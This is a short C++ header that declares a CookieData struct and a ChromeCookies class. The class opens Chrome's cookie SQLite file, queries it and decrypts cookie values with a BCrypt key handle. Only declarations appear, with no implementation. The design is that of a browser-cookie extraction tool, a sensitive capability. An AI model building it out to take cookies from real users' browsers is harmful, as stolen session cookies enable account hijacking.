#pragma once

#include "utils.hpp"

struct CookieData
{
	string HostKey;
	string Name;
	string Value;
	string Path;
	string ExpireUTC;
};

class ChromeCookies {
protected:
	char m_sFilePath[MAX_PATH];
	sqlite3_stmt* m_stmt;
public:
	ChromeCookies(char* sFilePath);
	~ChromeCookies();
	bool QuerySqlite();
	bool CookiesDecrypt(BCRYPT_KEY_HANDLE hKey);
};